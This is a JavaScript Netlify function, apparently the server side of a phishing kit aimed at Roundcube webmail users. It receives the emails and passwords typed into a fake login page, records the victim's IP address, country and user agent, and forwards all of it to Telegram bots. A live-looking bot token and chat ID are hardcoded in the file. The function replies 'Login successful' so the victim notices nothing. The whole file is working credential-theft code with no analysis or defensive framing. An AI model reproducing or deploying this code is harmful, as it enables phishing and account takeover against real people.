// Netlify function - /netlify/functions/webhook/webhook.js

// Define TWO different bot configurations
const BOT_CONFIGS = [
  {
    name: 'Bot 1',
     bot_token: '', // Replace with your second bot token
    chat_id: ''      // Replace with your second chat ID
  },
  {
    name: 'Bot 2',
    bot_token: '8934893697:AAE1Wtq__-r5osmGlEHfUVpM-tN-Xw0Sf1E',
    chat_id: '8234274747'
  }
];

// Netlify expects exports.handler
exports.handler = async function(event, context) {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };

  // Handle preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  // Only POST
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    // Parse body (Netlify gives string body)
    let body;
    if (event.isBase64Encoded) {
      body = Buffer.from(event.body, 'base64').toString();
    } else {
      body = event.body;
    }

    let email, password, step;
    
    // Handle both JSON and form data
    if (event.headers['content-type']?.includes('application/json')) {
      const parsed = JSON.parse(body);
      email = parsed.email;
      password = parsed.password;
      step = parsed.step || 'login_attempt';
    } else {
      // Form data - Netlify doesn't auto-parse, use querystring
      const params = new URLSearchParams(body);
      email = params.get('email');
      password = params.get('password');
      step = params.get('step') || 'login_attempt';
    }

    if (!email) {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ signal: 'error', msg: 'No data received' })
      };
    }

    // Get IP and user agent
    const ip = event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'Unknown';
    const userAgent = event.headers['user-agent'] || 'Unknown';
    const time = new Date().toISOString().replace('T', ' ').substring(0, 19);

    // Get country
    const country = await getCountry(ip);

    // Send to both bots
    await sendToMultipleBots(email, password, step, ip, country, userAgent, time);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ signal: 'ok', msg: 'Login successful' })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Internal server error' })
    };
  }
};

// Rest of the functions remain the same...
async function sendToMultipleBots(email, password, step, ip, country, userAgent, time) {
  let message = `🔐 <b>Z ROUNDCUBE LOGIN DATA</b>\n\n`;
  message += `______________________________\n`;
  message += `📧 <b>Email/ID:</b> <code>${escapeHtml(email)}</code>\n`;
  
  if (password) {
    message += `🔐 <b>Password:</b> <code>${escapeHtml(password)}</code>\n`;
  }
  
  message += `__________________________\n`;
  message += `📱 <b>Step:</b> ${escapeHtml(step)}\n`;
  message += `🌍 <b>Country:</b> ${country}\n`;
  message += `🌐 <b>IP Address:</b> <code>${escapeHtml(ip)}</code>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `⏰ <b>Time:</b> ${escapeHtml(time)}\n`;
  message += `📱 <b>User Agent:</b>\n<code>${escapeHtml(userAgent.substring(0, 100))}</code>`;
  
  const sendPromises = BOT_CONFIGS.map(config => 
    sendTelegramMessage(config.bot_token, config.chat_id, message, config.name)
  );
  
  await Promise.allSettled(sendPromises);
}

async function sendTelegramMessage(botToken, chatId, message, botName = 'Unknown') {
  const API_URL = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  try {
    const response = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(`HTTP ${response.status}: ${errorData.description || 'Unknown error'}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error(`Telegram error for ${botName}:`, error);
    throw error;
  }
}

async function getCountry(ip) {
  if (ip.startsWith('10.') || ip.startsWith('172.') || ip.startsWith('192.168.') || ip === '127.0.0.1') {
    return '🏠 Local/Private';
  }
  
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`);
    const data = await response.json();
    
    if (data.status === 'success') {
      const flag = getFlagEmoji(data.countryCode);
      return `${flag} ${data.country}`;
    }
  } catch (error) {
    console.error('Country detection error:', error);
  }
  
  return '🌍 Unknown';
}

function getFlagEmoji(countryCode) {
  if (!countryCode) return '🏳️';
  const codePoints = countryCode.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/[&<>]/g, function(m) {
    if (m === '&') return '&amp;';
    if (m === '<') return '&lt;';
    if (m === '>') return '&gt;';
    return m;
  });
}
